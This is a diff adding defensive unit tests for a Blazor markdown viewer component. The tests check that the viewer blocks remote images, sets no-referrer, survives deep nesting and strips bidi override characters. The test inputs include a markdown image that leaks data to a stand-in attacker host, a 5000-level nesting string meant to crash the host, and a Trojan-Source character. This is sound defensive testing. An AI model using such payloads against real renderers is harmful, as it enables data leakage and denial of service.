@@ -206,4 +206,135 @@ public class BitMarkdownViewerTests : BunitTestContext
 
         Assert.Contains("<del>gone</del>", component.Markup);
     }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldBlockRemoteImagesInSameOriginMode()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        // No src means the browser never issues the cross-origin (exfiltration) request.
+        var src = imgs[0].GetAttribute("src") ?? string.Empty;
+        Assert.AreEqual(string.Empty, src);
+        // Alt text is preserved for accessibility.
+        Assert.AreEqual("leak", imgs[0].GetAttribute("alt"));
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldKeepRelativeImagesInSameOriginMode()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual("/assets/logo.png", imgs[0].GetAttribute("src"));
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldBlockProtocolRelativeImagesInSameOriginMode()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![x](//attacker.com/a.png)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldBlockAllImagesInNoneMode()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.None);
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldAddNoReferrerToImages()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![x](https://example.com/a.png)");
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual("https://example.com/a.png", imgs[0].GetAttribute("src"));
+        Assert.AreEqual("no-referrer", imgs[0].GetAttribute("referrerpolicy"));
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldNotOverflowOnDeeplyNestedInput()
+    {
+        // Without a depth limit this triggers an (uncatchable) StackOverflowException
+        // that would crash the host. The depth guard must keep it bounded.
+        var markdown = new string('>', 5000) + " boom";
+
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, markdown);
+        });
+
+        Assert.Contains("boom", component.Markup);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldStripBidiControlCharactersWhenEnabled()
+    {
+        // U+202E (RIGHT-TO-LEFT OVERRIDE) is a Trojan-Source spoofing character.
+        var markdown = "a\u202Eb";
+
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, markdown);
+            parameters.Add(p => p.StripBidiControlCharacters, true);
+        });
+
+        Assert.DoesNotContain("\u202E", component.Markup);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldKeepBidiControlCharactersByDefault()
+    {
+        var markdown = "a\u202Eb";
+
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, markdown);
+        });
+
+        Assert.Contains("\u202E", component.Markup);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldRespectMaxLength()
+    {
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "# hello world");
+            parameters.Add(p => p.MaxLength, 3); // "# h"
+        });
+
+        var markup = component.Markup;
+        Assert.Contains("<h1>h</h1>", markup);
+        Assert.DoesNotContain("hello", markup);
+    }
 }
